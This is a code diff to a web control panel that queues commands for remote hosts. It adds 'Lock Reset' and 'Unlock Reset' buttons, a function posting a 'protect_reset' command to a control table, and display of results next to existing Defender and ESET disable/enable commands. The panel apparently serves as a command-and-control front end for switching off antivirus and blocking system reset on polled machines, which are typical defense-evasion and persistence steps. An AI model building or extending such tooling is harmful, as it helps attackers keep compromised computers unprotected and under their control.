@@ -374,6 +374,11 @@
         <button class="px-4 py-2 text-sm font-medium text-white bg-orange-600 hover:bg-orange-700 rounded-lg border border-orange-500 transition" onclick="sendDefender('eset:disable')">Disable</button>
         <button class="px-4 py-2 text-sm font-medium text-white bg-amber-600 hover:bg-amber-700 rounded-lg border border-amber-500 transition" onclick="sendDefender('eset:enable')">Enable</button>
       </div>
+      <div class="flex items-center gap-3 mb-4">
+        <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider w-16">Reset</span>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-rose-700 hover:bg-rose-600 rounded-lg border border-rose-500 transition" onclick="sendProtectReset('enable')">Lock Reset</button>
+        <button class="px-4 py-2 text-sm font-medium text-white bg-teal-700 hover:bg-teal-600 rounded-lg border border-teal-500 transition" onclick="sendProtectReset('disable')">Unlock Reset</button>
+      </div>
       <div id="defenderResults" class="text-sm mono-log text-slate-400 bg-slate-950/50 rounded-lg p-4 border border-slate-800 overflow-y-auto" style="min-height:120px">Select a host and click Disable or Enable</div>
     </main>
   </div>
@@ -1464,15 +1469,21 @@ async function fetchDefenderResults() {
     const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/exec_results?order=created_at.desc&limit=10'));
     if (!res.ok) return;
     const data = await res.json();
-    const rows = data.filter(r => r.command && r.command.startsWith('disable_defender'));
+    const rows = data.filter(r => r.command && (r.command.startsWith('disable_defender') || r.command.startsWith('protect_reset'))).slice(0, 5);
     if (rows.length === 0) return;
-    container.innerHTML = rows.slice(0, 5).map(r => {
+    container.innerHTML = rows.map(r => {
       const ts = r.created_at ? new Date(r.created_at).toLocaleString() : '-';
       const cmdStr = r.command || '';
-      const isEnable = cmdStr.includes('enable');
-      const isEset = cmdStr.includes('eset:');
-      const av = isEset ? 'ESET' : 'Defender';
-      const label = (isEnable ? 'Enable ' : 'Disable ') + av;
+      const isReset = cmdStr.startsWith('protect_reset');
+      let label;
+      if (isReset) {
+        label = cmdStr.includes('enable') ? 'Lock Reset' : 'Unlock Reset';
+      } else {
+        const isEnable = cmdStr.includes('enable');
+        const isEset = cmdStr.includes('eset:');
+        const av = isEset ? 'ESET' : 'Defender';
+        label = (isEnable ? 'Enable ' : 'Disable ') + av;
+      }
       const ok = r.exit_code === 0;
       const denied = r.exit_code === 2;
       let color, icon;
@@ -1491,6 +1502,20 @@ async function fetchDefenderResults() {
         + '</div>';
     }).join('');
   } catch (_) {}
+}
+
+async function sendProtectReset(action) {
+  const hostname = document.getElementById('defenderHostSelect').value;
+  if (!hostname) { showToast('Select a host', 'error'); return; }
+  const label = action === 'enable' ? 'Lock Reset' : 'Unlock Reset';
+  try {
+    await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'protect_reset', hostname: hostname, payload: action, executed: false })
+    });
+    showToast(label + ' requested for ' + hostname + ' (check in ~60s)', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
 }
 
 document.getElementById('stopBtn').addEventListener('click', sendStop);
